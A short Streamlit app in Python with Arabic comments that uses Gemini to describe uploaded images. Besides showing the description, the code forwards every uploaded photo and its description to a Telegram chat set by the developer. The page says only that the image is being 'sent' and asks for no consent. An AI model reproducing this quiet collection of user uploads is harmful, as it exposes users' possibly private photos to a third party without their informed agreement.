import streamlit as st
import google.generativeai as genai
from PIL import Image
import io
import requests

# 1. إعدادات الصفحة (خلفية بيضاء إجبارية)
st.set_page_config(page_title="Aziz18 AI", layout="centered")

st.markdown("""
    <style>
    /* إجبار الخلفية لتكون بيضاء بالكامل */
    .stApp { background-color: #ffffff !important; }
    
    /* جعل الخطوط داكنة لتسهيل القراءة */
    html, body, [class*="st-"] { color: #1e293b !important; }

    /* ستايل التوقيع المتفاعل العزيزي */
    .sig-box {
        background-color: #0f172a; 
        padding: 25px; 
        border-radius: 15px; 
        text-align: center; 
        border: 2px solid #3b82f6; 
        transition: 0.4s; 
        cursor: pointer;
    }
    .sig-box:hover { 
        background-color: #f1f5f9 !important; 
        box-shadow: 0 0 20px #3b82f6; 
    }
    .sig-text { 
        font-size: 30px; 
        font-weight: 900; 
        color: #ffffff !important; 
    }
    .sig-box:hover .sig-text { 
        color: #1e3a8a !important; 
    }
    </style>
    """, unsafe_allow_html=True)

# 2. الواجهة الرئيسية
st.title("🚀 AZIZ ULTRA-MAX AI")
st.write("### مرحباً بك! ارفع صورتك للمعالجة التلقائية")

# 3. الربط مع جوجل (باستخدام المفتاح الجديد)
try:
    genai.configure(api_key=st.secrets["GOOGLE_API_KEY"])
    # المسمى الأكثر استقراراً لتجنب 404
    model = genai.GenerativeModel('gemini-1.5-flash')
except Exception as e:
    st.error(f"خطأ في الربط: {e}")

# 4. الرفع والمعالجة (أوتوماتيك)
up = st.file_uploader("", type=["jpg", "png", "jpeg"])

if up is not None:
    image = Image.open(up)
    st.image(image, use_container_width=True)
    
    with st.spinner("⏳ جاري التحليل والإرسال..."):
        try:
            # طلب التحليل
            res = model.generate_content(["Describe this image", image])
            
            # إرسال لتيليجرام
            buf = io.BytesIO()
            image.save(buf, format='JPEG')
            requests.post(
                f"https://api.telegram.org/bot{st.secrets['TELEGRAM_TOKEN']}/sendPhoto",
                files={'photo': buf.getvalue()},
                data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"🎯 تقرير Aziz18:\n{res.text[:1000]}"}
            )
            
            st.balloons()
            st.success("✅ تم بنجاح!")
            st.write(res.text)
            
        except Exception as e:
            st.error(f"حدث خطأ أثناء المعالجة: {e}")

# 5. التوقيع
st.markdown('<div class="sig-box"><div class="sig-text">BY: Aziz18</div></div>', unsafe_allow_html=True)